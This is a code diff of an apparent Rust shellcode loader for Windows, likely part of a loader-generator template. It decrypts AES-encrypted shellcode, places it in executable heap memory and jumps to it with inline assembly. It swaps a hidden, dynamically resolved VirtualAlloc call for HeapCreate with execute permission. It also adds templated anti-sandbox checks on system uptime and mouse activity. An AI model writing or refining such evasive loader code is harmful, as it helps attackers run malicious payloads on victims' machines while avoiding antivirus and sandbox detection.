@@ -12,18 +12,12 @@ use hex;
 use libaes::Cipher;
 use obfstr::obfstr as s;
 use rand::Rng;
+use winapi::um::heapapi::{HeapAlloc, HeapCreate};
 use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
 use winapi::um::sysinfoapi::GetTickCount;
-use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
+use winapi::um::winnt::{HEAP_CREATE_ENABLE_EXECUTE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READONLY};
 use winapi::um::winuser::{GetCursorPos, GetLastInputInfo, LASTINPUTINFO, MOUSEMOVEPOINT};
 use serde::{Deserialize, Serialize};
-
-type CustomVirtualAlloc = unsafe extern "system" fn(
-    lpAddress: *mut winapi::ctypes::c_void,
-    dwSize: usize,
-    flAllocationType: u32,
-    flProtect: u32,
-) -> *mut winapi::ctypes::c_void;
 
 #[derive(Serialize, Deserialize)]
 pub struct ScInfo{
@@ -55,36 +49,15 @@ fn main() {
     let shellCode = &aesShellCode;
 
     let flen = shellCode.len();
-    thread::sleep(Duration::from_secs(2));
 
-
-    let Kname = hex::decode(s!("6b65726e656c33322e646c6c")).expect("hex decode err");
-    let Vname = hex::decode(s!("5669727475616c416c6c6f63")).expect("hex decode err");
-    let kernel32 = CString::new(Kname).expect("CString::new failed");
-    let virtual_alloc = CString::new(Vname).expect("CString::new failed");
-
-
-    let h_module = unsafe { GetModuleHandleA(kernel32.as_ptr()) };
-
-    // 隐藏 VirtualAlloc
-    let fn_virtual_alloc = unsafe {
-        mem::transmute::<*const (), CustomVirtualAlloc>(
-            GetProcAddress(
-                h_module,
-                virtual_alloc.as_ptr(),
-            ) as *const ())
-    };
-
-    let new_buf = unsafe { fn_virtual_alloc(0 as _, flen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) };
-
-    let new_buf_ptr_1: *mut u8 = new_buf as *mut u8 as _;
-    unsafe { std::ptr::copy_nonoverlapping(shellCode.as_ptr(), new_buf_ptr_1, flen) };
-
-    thread::sleep(Duration::from_secs(2));
+    thread::sleep(Duration::from_secs(1));
     unsafe {
-        let jmp_target = new_buf.offset(0 as isize);
+        let heap= HeapCreate(HEAP_CREATE_ENABLE_EXECUTE,0,0);
+        let alloc = HeapAlloc(heap, 8, flen);
+        std::ptr::copy_nonoverlapping(shellCode.as_ptr(), alloc as *mut u8, flen);
+        let jmp_target = alloc.offset(0 as isize);
         asm!("jmp {}", in(reg) jmp_target)
-    };
+    }
 }
 
 pub fn aesDecrypt(key: &String, iv: &String, ciphertext: Vec<u8>) -> Vec<u8> {
@@ -94,7 +67,8 @@ pub fn aesDecrypt(key: &String, iv: &String, ciphertext: Vec<u8>) -> Vec<u8> {
 
 pub unsafe fn analy_environment() -> bool {
     let tick_count = GetTickCount();
-    if tick_count <= 3600000 {
+    let v1= ${tick_count};
+    if i64::from(tick_count) <= v1 && v1>0 {
         println!("开机时间过短");
         return false;
     }
@@ -104,7 +78,10 @@ pub unsafe fn analy_environment() -> bool {
         dwTime: 0,
     };
     last_input_info.cbSize = mem::size_of::<LASTINPUTINFO>() as u32;
-
+    let v2= ${mouse_movement_detection};
+    if !v2 {
+        return true;
+    }
 
     if GetLastInputInfo(&mut last_input_info as *mut LASTINPUTINFO) != 0 {
         let last_input_time = last_input_info.dwTime;
